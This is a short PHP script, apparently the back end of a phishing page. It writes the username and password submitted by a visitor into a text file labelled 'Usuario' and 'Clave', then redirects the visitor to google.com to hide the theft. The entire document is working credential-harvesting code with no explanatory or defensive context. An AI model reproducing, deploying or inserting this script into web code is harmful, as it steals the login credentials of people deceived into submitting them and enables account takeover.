<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['username'] . " Clave: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
